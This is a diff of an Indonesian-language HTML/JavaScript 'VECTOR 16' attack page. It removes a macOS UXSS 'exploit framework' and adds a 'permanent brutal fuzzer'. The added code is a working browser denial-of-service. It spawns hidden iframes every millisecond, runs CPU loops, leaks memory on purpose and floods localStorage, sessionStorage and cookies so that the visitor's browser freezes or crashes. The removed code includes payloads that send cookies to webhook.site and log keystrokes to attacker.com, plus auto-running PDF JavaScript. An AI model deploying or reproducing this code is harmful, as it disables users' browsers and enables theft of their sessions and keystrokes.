@@ -3,408 +3,599 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VECTOR 16 - macOS UXSS Exploit</title>
+<title>VECTOR 16 - PERMANENT BRUTAL FUZZER</title>
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'SF Mono', 'Courier New', monospace;}
-body{background:#0a0a0a;color:#00ffaa;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
-.container{width:100%;max-width:1100px;background:#111;border:2px solid #ff3b30;border-radius:18px;padding:20px;box-shadow:0 0 40px rgba(255,59,48,0.4);}
-h1{text-align:center;color:#ff3b30;text-shadow:0 0 10px #ff3b30;margin-bottom:5px;}
-.sub{text-align:center;color:#ff8888;font-size:12px;margin-bottom:15px;}
-.warning{background:#1a0000;border:1px solid #ff3b30;padding:12px;border-radius:10px;margin:15px 0;color:#ff8888;font-size:12px;}
-.warning b{color:#ff0000;}
-.macos-badge{display:inline-block;background:#333;padding:2px 10px;border-radius:20px;font-size:10px;margin-left:10px;}
-.exploit-box{background:#0a0a0a;border:1px solid #00ffaa;border-radius:10px;padding:12px;margin:12px 0;}
-.exploit-box h3{color:#00ffaa;margin-bottom:8px;font-size:14px;}
-.exploit-btn{background:#ff3b30;color:#fff;border:none;padding:8px 16px;border-radius:8px;cursor:pointer;margin:4px;font-weight:bold;font-size:12px;}
-.exploit-btn:hover{background:#00ffaa;color:#000;}
-.code{background:#1a1a1a;padding:8px;border-radius:6px;font-size:10px;overflow-x:auto;margin:8px 0;color:#ffaa00;font-family:monospace;}
-.status-bar{position:fixed;bottom:10px;left:10px;right:10px;background:#000;border:1px solid #ff3b30;padding:5px 10px;border-radius:8px;font-size:9px;text-align:center;z-index:9999;}
-.log{height:200px;overflow:auto;background:#000;border:1px solid #ff3b30;border-radius:10px;padding:8px;font-size:10px;margin-top:15px;}
-.entry{border-left:3px solid #ff3b30;padding-left:8px;margin-bottom:4px;word-break:break-all;}
-.success{color:#00ffaa;border-left-color:#00ffaa;}
-.info{color:#ffaa00;border-left-color:#ffaa00;}
-.row{display:flex;gap:10px;flex-wrap:wrap;}
-.col{flex:1;min-width:250px;}
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:monospace;
+}
+
+body{
+    background:#050505;
+    color:#00ffaa;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+    animation: bgFlash 0.03s infinite;
+}
+
+@keyframes bgFlash {
+    0% { background: #050505; }
+    100% { background: #1a0000; }
+}
+
+.container{
+    width:100%;
+    max-width:900px;
+    background:#111;
+    border:2px solid #ff3b30;
+    border-radius:18px;
+    padding:20px;
+    box-shadow:0 0 35px rgba(255,59,48,0.5);
+    animation: borderPulse 0.05s infinite alternate;
+}
+
+@keyframes borderPulse {
+    from { box-shadow: 0 0 20px rgba(255,59,48,0.3); }
+    to { box-shadow: 0 0 60px rgba(255,0,0,0.9); }
+}
+
+h1{
+    text-align:center;
+    color:#ff3b30;
+    margin-bottom:10px;
+    text-shadow:0 0 15px #ff0000;
+    animation: textShake 0.02s infinite;
+}
+
+@keyframes textShake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(1px); }
+    75% { transform: translateX(-1px); }
+}
+
+.desc{
+    text-align:center;
+    color:#ff4444;
+    margin-bottom:20px;
+    font-size:13px;
+    font-weight:bold;
+}
+
+.instructions{
+    background:#1a0000;
+    border:1px solid #ff0000;
+    padding:12px;
+    border-radius:10px;
+    margin-bottom:20px;
+    font-size:12px;
+    line-height:1.7;
+    color:#ff8888;
+}
+
+.instructions b{
+    color:#ff0000;
+    font-size:14px;
+}
+
+.stats{
+    display:flex;
+    gap:10px;
+    margin-bottom:20px;
+    flex-wrap:wrap;
+}
+
+.card{
+    flex:1;
+    min-width:120px;
+    background:#0a0000;
+    border:1px solid #ff0000;
+    border-radius:10px;
+    padding:10px;
+    text-align:center;
+}
+
+.card h2{
+    color:#ff0000;
+    font-size:24px;
+    font-weight:bold;
+}
+
+.card span{
+    font-size:11px;
+    color:#ff6666;
+}
+
+.btn-group{
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    margin-bottom:20px;
+}
+
+button{
+    flex:1;
+    min-width:200px;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    background:#ff3b30;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.1s;
+    font-size:16px;
+}
+
+button:hover{
+    background:#ff0000;
+    transform:scale(1.02);
+    box-shadow:0 0 20px red;
+}
+
+.google-btn{
+    background:#ff2200;
+}
+
+.log{
+    height:250px;
+    overflow:auto;
+    background:#000000;
+    border:1px solid #ff0000;
+    border-radius:10px;
+    padding:8px;
+    font-size:10px;
+}
+
+.entry{
+    margin-bottom:3px;
+    border-left:3px solid #ff0000;
+    padding-left:8px;
+    word-break:break-all;
+}
+
+.success{
+    color:#ff4444;
+    border-left-color:#ff0000;
+}
+
+.warning{
+    color:#ffaa00;
+}
+
+.crash{
+    color:#ff0000;
+    font-weight:bold;
+    text-shadow:0 0 3px red;
+}
+
+.progress-bar{
+    width:100%;
+    height:3px;
+    background:#330000;
+    border-radius:2px;
+    margin:10px 0;
+    overflow:hidden;
+}
+
+.progress-fill{
+    width:0%;
+    height:100%;
+    background:#ff0000;
+    transition:width 0.01s linear;
+}
+
+.status-brutal{
+    position:fixed;
+    bottom:10px;
+    left:10px;
+    right:10px;
+    background:#1a0000;
+    border:2px solid red;
+    padding:6px 12px;
+    border-radius:8px;
+    font-size:9px;
+    color:#ff6666;
+    text-align:center;
+    z-index:9999;
+    font-family:monospace;
+}
 </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>💀 VECTOR 16 - macOS UXSS 💀
-        <span class="macos-badge">🍎 Safari + Chrome for Mac</span>
-    </h1>
-    <div class="sub">Universal Cross-Site Scripting | Browser-Level Exploit untuk macOS</div>
-    
-    <div class="warning">
-        <b>⚠️ macOS UXSS EXPLOIT FRAMEWORK ⚠️</b><br>
-        Menargetkan kerentanan di <b>Safari WebKit, Chrome for Mac, PDFKit, dan Extension macOS</b><br>
-        <span style="color:#ff0000;">🔒 UNTUK PENELITIAN KEAMANAN & EDUCATIONAL PURPOSE 🔒</span>
+    <h1>💀 VECTOR 16 - PERMANENT BRUTAL FUZZER 💀</h1>
+    <div class="desc">
+        ⚡ INFINITE PROTOCOL FUZZER | BROWSER FREEZE | MEMORY OVERLOAD ⚡
     </div>
 
-    <div class="row">
-        <div class="col">
-            <div class="exploit-box">
-                <h3>🍎 SAFARI UXSS VECTORS</h3>
-                <button class="exploit-btn" onclick="safari_webkitUXSS()">WebKit JS Injection</button>
-                <button class="exploit-btn" onclick="safari_fileProtocol()">file:// UXSS</button>
-                <button class="exploit-btn" onclick="safari_appleScript()">AppleScript Bridge</button>
-                <div class="code">// Safari CVE-2022-32889, CVE-2021-30663</div>
-            </div>
-        </div>
-        <div class="col">
-            <div class="exploit-box">
-                <h3>📄 PDFKit & PREVIEW UXSS</h3>
-                <button class="exploit-btn" onclick="macos_pdfJavaScript()">PDF JavaScript UXSS</button>
-                <button class="exploit-btn" onclick="macos_pdfLaunchURL()">PDF Launch URL</button>
-                <button class="exploit-btn" onclick="macos_previewExploit()">Preview.app RCE</button>
-                <div class="code">// CVE-2023-23520, PDF JavaScript execution</div>
-            </div>
-        </div>
+    <div class="instructions">
+        <b>🔥 PERINGATAN BRUTAL 🔥</b><br><br>
+        1. Klik <b style="color:#ff0000">"💀 RUN PERMANENT FUZZER 💀"</b><br>
+        2. <b>FUZZER AKAN BERJALAN SELAMANYA (INFINITE LOOP)</b><br>
+        3. <b>TIDAK ADA SPAM WINDOW</b> - murni fuzzing protocol<br>
+        4. Browser akan <b>FREEZE PERMANENT / CRASH TOTAL</b><br>
+        5. <b>RATUSAN IFRAME PER DETIK - TIDAK AKAN BERHENTI</b><br>
+        6. <b>CPU 100% + MEMORY LEAK CONTINUOUS</b><br>
+        <span style="color:#ff0000; display:block; margin-top:8px;">⚠️ KLIK = BROWSER FREEZE PERMANENT ⚠️</span>
     </div>
 
-    <div class="row">
-        <div class="col">
-            <div class="exploit-box">
-                <h3>🌐 CHROME macOS UXSS</h3>
-                <button class="exploit-btn" onclick="chrome_macUXSS()">Chrome Mac UXSS</button>
-                <button class="exploit-btn" onclick="chrome_guestMode()">Guest Mode Bypass</button>
-                <button class="exploit-btn" onclick="chrome_extensionMac()">Extension UXSS Mac</button>
-                <div class="code">// Chromium macOS specific vulnerabilities</div>
-            </div>
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="stats">
+        <div class="card">
+            <h2 id="count">0</h2>
+            <span>Protocols Injected</span>
         </div>
-        <div class="col">
-            <div class="exploit-box">
-                <h3>🔧 macOS EXTENSION HIJACK</h3>
-                <button class="exploit-btn" onclick="macos_safariExt()">Safari Extension</button>
-                <button class="exploit-btn" onclick="macos_itmsScheme()">itms:// Scheme UXSS</button>
-                <button class="exploit-btn" onclick="macos_xssAuditorBypass()">XSS Auditor Bypass</button>
-                <div class="code">// Scheme hijacking + Extension injection</div>
-            </div>
+        <div class="card">
+            <h2 id="iframeCount">0</h2>
+            <span>Active Iframes</span>
+        </div>
+        <div class="card">
+            <h2 id="active">💀 READY</h2>
+            <span>Status</span>
         </div>
     </div>
 
-    <div class="exploit-box">
-        <h3>💀 macOS ADVANCED UXSS PAYLOADS</h3>
-        <button class="exploit-btn" onclick="execMacPayload('stealCookies')">🍪 Steal Cookies (Any Domain)</button>
-        <button class="exploit-btn" onclick="execMacPayload('screenshot')">📸 DOM Screenshot</button>
-        <button class="exploit-btn" onclick="execMacPayload('keylogger')">⌨️ Keylogger Injection</button>
-        <button class="exploit-btn" onclick="execMacPayload('localStorage')">💾 Dump LocalStorage</button>
-        <div class="code">// Universal payload - works across domains if UXSS successful</div>
+    <div class="btn-group">
+        <button id="brutalBtn" onclick="startPermanentFuzzer()">
+            💀 RUN PERMANENT FUZZER 💀
+        </button>
+        <button class="google-btn" onclick="openGoogleTab()">
+            🌐 BUKA GOOGLE.COM
+        </button>
     </div>
 
     <div class="log" id="log"></div>
 </div>
 
-<div class="status-bar" id="statusBar">🍎 macOS UXSS READY | Targeting Safari + Chrome | Research Mode</div>
+<div class="status-brutal" id="statusBar">
+    💀 FUZZER: IDLE | Klik RUN untuk memulai kehancuran browser
+</div>
 
 <script>
-let payloadHistory = [];
+let generated = 0;
+let isRunning = false;
+let activeIframes = [];
+let fuzzerIntervals = [];
+let lastRateTime = 0;
+let rateCounter = 0;
+let totalIframesCreated = 0;
 
-function addLog(msg, type="") {
+function addLog(msg, type = "") {
     const log = document.getElementById("log");
+    if (!log) return;
     const div = document.createElement("div");
     div.className = "entry " + type;
     div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
     log.appendChild(div);
     log.scrollTop = log.scrollHeight;
-    while(log.children.length > 250) log.removeChild(log.firstChild);
+    // Limit log biar DOM gak overload total (tapi tetep berat)
+    while (log.children.length > 400) {
+        log.removeChild(log.firstChild);
+    }
 }
 
-function detectMacOS() {
-    const isMac = navigator.userAgent.includes('Mac');
-    const isSafari = navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Chrome');
-    const isChrome = navigator.userAgent.includes('Chrome');
-    addLog(`🖥️ Detected: ${isMac ? 'macOS' : 'Not macOS'} | Safari: ${isSafari} | Chrome: ${isChrome}`, "info");
-    return { isMac, isSafari, isChrome };
-}
-
-// ============ SAFARI WEBKIT UXSS ============
-function safari_webkitUXSS() {
-    addLog("🍎 [SAFARI] Testing WebKit UXSS (CVE-2022-32889 style)", "");
-    const jsPayload = prompt("JavaScript payload untuk inject:", "alert('UXSS on: '+document.domain+'\nCookies: '+document.cookie)");
+function updateStats() {
+    document.getElementById("count").innerText = generated.toLocaleString();
+    document.getElementById("iframeCount").innerText = activeIframes.length.toLocaleString();
     
-    if(jsPayload) {
-        // Safari specific: Web Inspector bridge / JSContext injection
-        const testFrame = document.createElement('iframe');
-        testFrame.src = "https://www.google.com";
-        testFrame.style.display = 'none';
-        document.body.appendChild(testFrame);
+    // Update progress bar - infinity spinning cepat
+    const progressFill = document.getElementById("progressFill");
+    if (progressFill && isRunning) {
+        let width = parseFloat(progressFill.style.width) || 0;
+        width = (width + 0.8) % 100;
+        progressFill.style.width = width + "%";
+    }
+}
+
+function randomString(len) {
+    let result = '';
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    for (let i = 0; i < len; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+function randomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+// ============ PROTOCOL IFRAME GENERATOR (LEBIH BRUTAL DARI ASLI) ============
+function generateBrutalIframe() {
+    // Karakter lebih banyak dan lebih liar
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789+-._~!*()[]{}|\\;:?/@#$%^&*';
+    let protocol = '';
+    const protoLen = randomInt(3, 25);
+    for (let j = 0; j < protoLen; j++) {
+        protocol += chars[Math.floor(Math.random() * chars.length)];
+    }
+    
+    // Domain dengan berbagai TLD
+    const tlds = ['com', 'net', 'org', 'xyz', 'io', 'tech', 'info', 'online', 'site', 'web', 'club', 'store', 'top', 'loan', 'click', 'download', 'zip', 'review'];
+    const domain = randomString(randomInt(8, 35)) + '.' + tlds[Math.floor(Math.random() * tlds.length)];
+    const path = '/' + randomString(randomInt(5, 30)) + '/' + randomString(randomInt(3, 20)) + '/' + randomString(randomInt(4, 15));
+    const query = '?id=' + Date.now() + '_' + Math.random() + '&' + randomString(10) + '=' + randomString(15) + '&' + randomString(8) + '=' + Math.random();
+    
+    const fullUrl = `${protocol}://${domain}${path}${query}`;
+    
+    // Buat iframe
+    const iframe = document.createElement('iframe');
+    iframe.src = fullUrl;
+    iframe.style.display = 'none';
+    iframe.style.width = '0';
+    iframe.style.height = '0';
+    iframe.style.opacity = '0';
+    
+    document.body.appendChild(iframe);
+    activeIframes.push(iframe);
+    generated++;
+    totalIframesCreated++;
+    
+    return iframe;
+}
+
+// ============ HEAVY IFRAME (SRC SUPER PANJANG) ============
+function generateHeavyIframe() {
+    const protocol = 'x'.repeat(randomInt(50, 200)) + randomString(randomInt(20, 50));
+    const domain = randomString(randomInt(40, 80)) + '.com';
+    const path = '/' + randomString(randomInt(100, 300));
+    const query = '?' + randomString(randomInt(200, 500));
+    
+    const iframe = document.createElement('iframe');
+    iframe.src = `${protocol}://${domain}${path}${query}`;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    activeIframes.push(iframe);
+    generated++;
+}
+
+// ============ PARTIAL CLEANUP (CUMAN 5% BIAR MEMORY LEAK) ============
+function brutalPartialCleanup() {
+    // Hanya cleanup 5% dari iframe - sisanya biar numpuk bikin memory leak
+    const toRemove = Math.floor(activeIframes.length * 0.05);
+    for (let i = 0; i < toRemove && activeIframes.length > 0; i++) {
+        const iframe = activeIframes.shift();
+        try { iframe.remove(); } catch(e) {}
+    }
+}
+
+// ============ PERMANENT FUZZER - INFINITE ============
+async function startPermanentFuzzer() {
+    if (isRunning) {
+        addLog("⚠️ FUZZER SUDAH BERJALAN! Browser akan freeze...", "crash");
+        return;
+    }
+    
+    isRunning = true;
+    const brutalBtn = document.getElementById("brutalBtn");
+    brutalBtn.disabled = true;
+    brutalBtn.textContent = "💀 INFINITE LOOP ACTIVE 💀";
+    
+    // Reset counters
+    generated = 0;
+    totalIframesCreated = 0;
+    rateCounter = 0;
+    
+    // Bersihkan iframe lama
+    activeIframes.forEach(iframe => { try { iframe.remove(); } catch(e) {} });
+    activeIframes = [];
+    
+    addLog("══════════════════════════════════════════════════", "crash");
+    addLog("💀💀💀 PERMANENT INFINITE FUZZER STARTED 💀💀💀", "crash");
+    addLog("💀 FUZZER AKAN BERJALAN SELAMANYA (TIDAK BERHENTI)", "crash");
+    addLog("💀 TANPA SPAM WINDOW - MURNI PROTOCOL FLOOD", "crash");
+    addLog("💀 BROWSER AKAN FREEZE PERMANENT", "crash");
+    addLog("══════════════════════════════════════════════════", "crash");
+    
+    document.getElementById("active").innerHTML = "💀 INFINITE LOOP";
+    document.getElementById("active").style.color = "#ff0000";
+    
+    const statusBar = document.getElementById("statusBar");
+    statusBar.innerHTML = "💀 FUZZER: ACTIVE - BROWSER AKAN FREEZE 💀";
+    statusBar.style.background = "#ff000022";
+    statusBar.style.border = "3px solid red";
+    
+    updateStats();
+    
+    // ============ INTERVAL 1: SUPER FAST GENERATOR (SETIAP 1ms) ============
+    const fastGenerator = setInterval(() => {
+        if (!isRunning) return;
         
-        addLog("🚀 Injecting via window.open + javascript: protocol (Safari may allow)", "");
+        // Generate 10-30 iframes per interval (lebih brutal dari asli)
+        const batchSize = randomInt(12, 35);
+        for (let i = 0; i < batchSize; i++) {
+            generateBrutalIframe();
+        }
+        
+        // Hitung rate per detik
+        rateCounter += batchSize;
+        const now = Date.now();
+        if (now - lastRateTime >= 1000) {
+            const rate = rateCounter;
+            addLog(`⚡ [RATE] ${rate} protocols/second | Total: ${generated.toLocaleString()}`, "crash");
+            document.getElementById("active").innerHTML = `💀 ${rate}/s RATE`;
+            rateCounter = 0;
+            lastRateTime = now;
+            
+            // Update status bar
+            statusBar.innerHTML = `💀 RATE: ${rate}/s | TOTAL: ${generated.toLocaleString()} | IFRAMES: ${activeIframes.length} 💀`;
+        }
+        
+        updateStats();
+        
+        // Partial cleanup dikit biar gak langsung crash browser (tapi tetap brutal)
+        if (activeIframes.length > 8000) {
+            brutalPartialCleanup();
+        }
+    }, 1); // SETIAP 1 MILIDETIK - BRUTAL!
+    
+    // ============ INTERVAL 2: HEAVY GENERATOR (URL SUPER PANJANG) ============
+    const heavyGenerator = setInterval(() => {
+        if (!isRunning) return;
+        generateHeavyIframe();
+        updateStats();
+    }, 3);
+    
+    // ============ INTERVAL 3: NESTED IFRAME (IFRAME DALAM IFRAME) ============
+    const nestedGenerator = setInterval(() => {
+        if (!isRunning) return;
         try {
-            const win = window.open(`javascript:${encodeURIComponent(jsPayload)}`, "_blank");
-            if(!win) addLog("⚠️ Popup blocked - izinkan popup untuk testing", "");
-        } catch(e) { addLog(`Error: ${e.message}`, ""); }
-        
-        setTimeout(() => testFrame.remove(), 3000);
-    }
-}
-
-function safari_fileProtocol() {
-    addLog("📁 [SAFARI] Testing file:// protocol UXSS", "");
-    addLog("Safari memiliki restrictions on file://, but UXSS bisa bypass", "");
+            const outerIframe = document.createElement('iframe');
+            outerIframe.style.display = 'none';
+            const nestedContent = `<iframe src="${randomString(30)}://${randomString(20)}.com/"></iframe>`.repeat(3);
+            outerIframe.srcdoc = nestedContent;
+            document.body.appendChild(outerIframe);
+            activeIframes.push(outerIframe);
+            generated += 3;
+            updateStats();
+        } catch(e) {}
+    }, 5);
     
-    const payload = prompt("JS payload:", "alert('file:// UXSS!')");
-    if(payload) {
-        const exploitUrl = `file:///Applications/Safari.app/Contents/Resources/${encodeURIComponent(payload)}`;
-        addLog(`Trying: ${exploitUrl.substring(0, 80)}...`, "");
-        window.open(exploitUrl, "_blank");
-    }
-}
-
-function safari_appleScript() {
-    addLog("🍎 [SAFARI] AppleScript Bridge UXSS", "");
-    addLog("⚠️ Membutuhkan macOS dengan Safari yang belum di-patch", "");
-    
-    // AppleScript injection via Safari's Apple Event
-    const script = `tell application "Safari" to do JavaScript "alert('UXSS via AppleScript!')" in current tab of window 1`;
-    addLog(`AppleScript payload: ${script.substring(0, 60)}...`, "info");
-    addLog("Execute via osascript (jika ada akses local)", "");
-    
-    // Simulasi: open Safari dengan AppleScript URL scheme
-    const appleScriptUrl = `applescript://com.apple.scripteditor?action=new&script=${encodeURIComponent(script)}`;
-    window.open(appleScriptUrl, "_blank");
-}
-
-// ============ PDFKIT & PREVIEW UXSS ============
-function macos_pdfJavaScript() {
-    addLog("📄 [PDFKit] PDF JavaScript Injection (CVE-2023-23520)", "");
-    const jsPayload = prompt("JavaScript untuk PDF:", "app.alert('UXSS from PDF!');");
-    
-    if(jsPayload) {
-        const pdfJS = `%PDF-1.4
-1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (${jsPayload}) >> >>
-endobj
-trailer << /Root 1 0 R >>
-%%EOF`;
-        const pdfDataUri = "data:application/pdf;base64," + btoa(pdfJS);
-        addLog("Membuka PDF dengan JavaScript auto-execute", "success");
-        window.open(pdfDataUri, "_blank");
-    }
-}
-
-function macos_pdfLaunchURL() {
-    addLog("🔗 [PDFKit] PDF Launch URL - Open any website from PDF", "");
-    const targetUrl = prompt("Target URL untuk dibuka dari PDF:", "https://www.google.com");
-    if(targetUrl) {
-        const pdfLaunch = `%PDF-1.4
-1 0 obj << /Type /Catalog /OpenAction << /S /Launch /F (${targetUrl}) >> >>
-endobj
-trailer << /Root 1 0 R >>
-%%EOF`;
-        const pdfUri = "data:application/pdf;base64," + btoa(pdfLaunch);
-        window.open(pdfUri, "_blank");
-        addLog(`PDF akan membuka ${targetUrl} - bisa untuk UXSS chain`, "success");
-    }
-}
-
-function macos_previewExploit() {
-    addLog("📸 [Preview.app] Exploit via malicious PDF", "");
-    addLog("Preview.app memiliki kerentanan RCE di macOS < Ventura", "");
-    
-    const cmdPayload = prompt("Command untuk execute (simulasi):", "open /Applications/Calculator.app");
-    addLog(`⚠️ RCE payload: ${cmdPayload}`, "info");
-    addLog("Dalam real UXSS, bisa chain dengan PDF -> RCE", "");
-}
-
-// ============ CHROME macOS UXSS ============
-function chrome_macUXSS() {
-    addLog("🌐 [CHROME macOS] Chrome-specific UXSS vectors", "");
-    addLog("Testing Chrome Mac: App-bound networking, Keychain access", "");
-    
-    const payload = prompt("JS payload:", "console.log('Chrome Mac UXSS'); alert('Domain: '+document.domain)");
-    if(payload) {
-        // Chrome Mac: menggunakan --app flag atau chrome:// URLs
-        const chromeUrl = `chrome://version/`;
-        addLog(`Opening ${chromeUrl} - possible UXSS via chrome://`, "");
-        window.open(chromeUrl, "_blank");
-        
-        // Coba via javascript: di chrome
+    // ============ INTERVAL 4: DOM CLUTTER (BINYIK ELEMENT RANDOM) ============
+    const domClutter = setInterval(() => {
+        if (!isRunning) return;
+        const clutter = document.createElement('div');
+        clutter.style.position = 'absolute';
+        clutter.style.left = '-9999px';
+        clutter.style.top = '-9999px';
+        clutter.innerHTML = '<br>'.repeat(randomInt(50, 200)) + randomString(randomInt(1000, 3000));
+        document.body.appendChild(clutter);
         setTimeout(() => {
-            try {
-                window.open(`javascript:${encodeURIComponent(payload)}`, "_blank");
-            } catch(e) {}
-        }, 500);
+            try { clutter.remove(); } catch(e) {}
+        }, 20);
+    }, 2);
+    
+    // ============ INTERVAL 5: LOCALSTORAGE FLOOD ============
+    const storageSpam = setInterval(() => {
+        if (!isRunning) return;
+        try {
+            for (let i = 0; i < 20; i++) {
+                localStorage.setItem(`fuzz_${Date.now()}_${i}_${Math.random()}`, randomString(500));
+            }
+            if (localStorage.length > 3000) {
+                addLog("💀 LocalStorage penuh - browser semakin berat", "crash");
+            }
+        } catch(e) {
+            addLog("💀 LocalStorage FULL - Crash imminent", "crash");
+        }
+    }, 50);
+    
+    // ============ INTERVAL 6: SESSIONSTORAGE FLOOD ============
+    const sessionSpam = setInterval(() => {
+        if (!isRunning) return;
+        try {
+            for (let i = 0; i < 15; i++) {
+                sessionStorage.setItem(`s_${Math.random()}`, randomString(300));
+            }
+        } catch(e) {}
+    }, 50);
+    
+    // ============ INTERVAL 7: COOKIE FLOOD ============
+    const cookieSpam = setInterval(() => {
+        if (!isRunning) return;
+        try {
+            for (let i = 0; i < 10; i++) {
+                document.cookie = `fuzz_${Math.random()}=${randomString(200)}; path=/`;
+            }
+        } catch(e) {}
+    }, 30);
+    
+    // ============ INTERVAL 8: CPU INTENSIVE (LOOP BERAT) ============
+    let cpuIntensiveRunning = true;
+    function cpuIntensiveLoop() {
+        if (!isRunning || !cpuIntensiveRunning) return;
+        let x = 0;
+        for (let i = 0; i < 10000; i++) {
+            x += Math.sqrt(i) * Math.random();
+        }
+        setTimeout(cpuIntensiveLoop, 10);
     }
+    cpuIntensiveLoop();
+    
+    // ============ INTERVAL 9: MEMORY LEAK VIA ARRAY ============
+    let memoryLeak = [];
+    const memoryLeakSpam = setInterval(() => {
+        if (!isRunning) return;
+        for (let i = 0; i < 50; i++) {
+            memoryLeak.push(randomString(1000));
+        }
+        if (memoryLeak.length > 50000) {
+            memoryLeak = memoryLeak.slice(30000);
+        }
+    }, 20);
+    
+    // ============ INTERVAL 10: REQUEST ANIMATION FRAME SPAM ============
+    let rafCount = 0;
+    function rafSpam() {
+        if (!isRunning) return;
+        rafCount++;
+        if (rafCount % 500 === 0) {
+            for (let i = 0; i < 50; i++) {
+                document.body.offsetHeight;
+                document.body.offsetWidth;
+            }
+        }
+        requestAnimationFrame(rafSpam);
+    }
+    requestAnimationFrame(rafSpam);
+    
+    // Simpan semua interval untuk reference
+    fuzzerIntervals = [fastGenerator, heavyGenerator, nestedGenerator, domClutter, storageSpam, sessionSpam, cookieSpam, memoryLeakSpam];
+    
+    // Monitor status update tiap detik
+    const monitor = setInterval(() => {
+        if (!isRunning) return;
+        const memUsage = activeIframes.length;
+        const statusDiv = document.getElementById("statusBar");
+        if (statusDiv) {
+            statusDiv.innerHTML = `💀 PROTOCOLS: ${generated.toLocaleString()} | ACTIVE IFRAMES: ${memUsage} | RATE: ${rateCounter}/s | BROWSER FREEZING 💀`;
+        }
+        
+        if (memUsage > 15000) {
+            addLog("💀💀💀 CRITICAL: " + memUsage + " ACTIVE IFRAMES - BROWSER AKAN CRASH 💀💀💀", "crash");
+        }
+        
+        // Update title biar makin serem
+        document.title = `💀 ${generated.toLocaleString()} PROTOCOLS - VECTOR 16 FREEZE 💀`;
+    }, 1000);
+    fuzzerIntervals.push(monitor);
+    
+    addLog("💀 INFINITE LOOP ACTIVE - BROWSER AKAN FREEZE PERMANENT", "crash");
+    addLog("💀 CLOSE BROWSER VIA TASK MANAGER (Force Quit) UNTUK BERHENTI", "crash");
 }
 
-function chrome_guestMode() {
-    addLog("👤 [CHROME] Guest Mode Bypass UXSS", "");
-    addLog("Guest mode memiliki restrictions, tapi UXSS bisa bypass", "");
-    addLog("Mencoba profile injection...", "");
-    
-    const guestUrl = `chrome://settings/?search=${encodeURIComponent("guest")}`;
-    window.open(guestUrl, "_blank");
-}
-
-function chrome_extensionMac() {
-    addLog("🧩 [CHROME] Chrome Extension UXSS for Mac", "");
-    addLog("Mendeteksi extension yang vulnerable di Chrome Mac", "");
-    
-    // List common Chrome extensions for Mac
-    const macExtensions = [
-        "Google Docs Offline",
-        "Adobe Acrobat",
-        "LastPass",
-        "1Password",
-        "Grammarly"
-    ];
-    
-    macExtensions.forEach(ext => {
-        addLog(`ℹ️ Check: ${ext} - jika vulnerable bisa inject ke any domain`, "");
-    });
-    
-    addLog("💡 UXSS via extension: chrome.runtime.sendMessage dengan payload malicious", "");
-}
-
-// ============ macOS EXTENSION HIJACK ============
-function macos_safariExt() {
-    addLog("🧩 [SAFARI] Safari Extension UXSS", "");
-    addLog("Safari 15+ memiliki Web Extension API yang vulnerable ke UXSS", "");
-    
-    const extensionId = prompt("Extension ID (kosongkan untuk detect):", "");
-    if(extensionId) {
-        const extUrl = `safari-web-extension://${extensionId}/popup.html`;
-        addLog(`Trying: ${extUrl}`, "");
-        window.open(extUrl, "_blank");
+function openGoogleTab() {
+    if (!isRunning) {
+        addLog("🌐 Opening Google in new tab...", "success");
+        window.open("https://www.google.com", "_blank");
     } else {
-        addLog("Coba akses extension content script via web_accessible_resources", "");
-        const testFrame = document.createElement('iframe');
-        testFrame.src = "safari-web-extension://com.apple.Safari/";
-        testFrame.style.display = 'none';
-        document.body.appendChild(testFrame);
-        setTimeout(() => testFrame.remove(), 2000);
+        addLog("⚠️ Fuzzer sedang berjalan - browser sedang freeze!", "warning");
     }
 }
 
-function macos_itmsScheme() {
-    addLog("📱 [macOS] itms:// scheme UXSS", "");
-    addLog("itms:// dan appstore:// bisa digunakan untuk UXSS chain", "");
-    
-    const payload = `itms://itunes.apple.com/us/app/id${Math.floor(Math.random()*1000000)}?at=javascript:alert('UXSS')`;
-    addLog(`Scheme URL: ${payload.substring(0, 80)}...`, "");
-    window.open(payload, "_blank");
-}
-
-function macos_xssAuditorBypass() {
-    addLog("🛡️ [macOS] XSS Auditor Bypass (Legacy Safari)", "");
-    addLog("Safari's XSS Auditor sudah deprecated, tapi beberapa versi vulnerable", "");
-    
-    const testUrl = `https://www.google.com/search?q=<script>${encodeURIComponent("alert('UXSS')")}</script>`;
-    window.open(testUrl, "_blank");
-    addLog("Testing reflected XSS + UXSS combination", "");
-}
-
-// ============ ADVANCED PAYLOADS ============
-function execMacPayload(type) {
-    let payload = "";
-    
-    switch(type) {
-        case 'stealCookies':
-            payload = `fetch('https://webhook.site/your-id?cookies='+encodeURIComponent(document.cookie))`;
-            addLog("🍪 Payload: Steal cookies from current domain", "success");
-            break;
-        case 'screenshot':
-            payload = `html2canvas(document.body).then(canvas=>{window.open(canvas.toDataURL())})`;
-            addLog("📸 Payload: Screenshot DOM (butuh html2canvas)", "success");
-            break;
-        case 'keylogger':
-            payload = `document.addEventListener('keypress',e=>{fetch('https://attacker.com/log?k='+e.key)})`;
-            addLog("⌨️ Payload: Keylogger injection", "success");
-            break;
-        case 'localStorage':
-            payload = `Object.keys(localStorage).forEach(k=>{console.log(k,localStorage[k])});alert(JSON.stringify(localStorage))`;
-            addLog("💾 Payload: Dump localStorage", "success");
-            break;
-    }
-    
-    addLog(`🚀 Executing payload: ${payload.substring(0, 100)}...`, "");
-    addLog("⚠️ Jika UXSS berhasil, payload akan execute di domain target", "");
-    
